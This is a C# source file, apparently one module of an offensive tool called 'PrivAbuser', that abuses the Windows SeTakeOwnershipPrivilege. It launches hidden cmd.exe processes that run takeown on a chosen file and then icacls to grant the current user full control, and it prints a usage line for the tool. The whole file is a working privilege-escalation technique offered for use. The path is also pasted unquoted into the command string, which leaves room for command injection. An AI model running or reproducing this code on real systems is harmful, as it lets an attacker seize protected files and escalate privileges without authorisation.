using System;
using System.Diagnostics;

namespace PrivAbuser.Abuser
{
    public class SeTakeOwnershipPrivilige
    {
        public static void helper()
        {
            Console.WriteLine("Usage: <exe> /abuseTakeOwnershipPrivilege /path=<path_to_file>");
        }
        public static void abuse(string path)
        {
            ProcessStartInfo ps = new ProcessStartInfo();
            ps.FileName = "cmd.exe";
            ps.WindowStyle = ProcessWindowStyle.Hidden;
            Console.WriteLine(String.Format("[*] Taking ownership of the file {0}", path));
            ps.Arguments = String.Format("/c takeown.exe /f {0}", path);
            Process.Start(ps);
            Console.WriteLine(String.Format("[*] Granting full access to the file {0}", path));
            ps.Arguments = String.Format("/c icacls {0} /grant %USERNAME%:F", path);
            Process.Start(ps);
        }
    }
}
